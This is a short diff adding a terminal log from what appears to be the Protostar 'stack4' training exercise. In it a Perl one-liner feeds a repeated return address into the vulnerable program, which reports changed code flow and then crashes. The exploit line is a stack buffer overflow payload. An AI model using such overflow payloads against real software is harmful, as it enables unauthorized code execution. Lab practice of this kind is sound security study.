@@ -1,0 +1,3 @@
+$ perl -e 'print "\xfa\x83\x04\x08" x 20' | ./stack4
+code flow successfully changed
+Segmentation fault (core dumped)
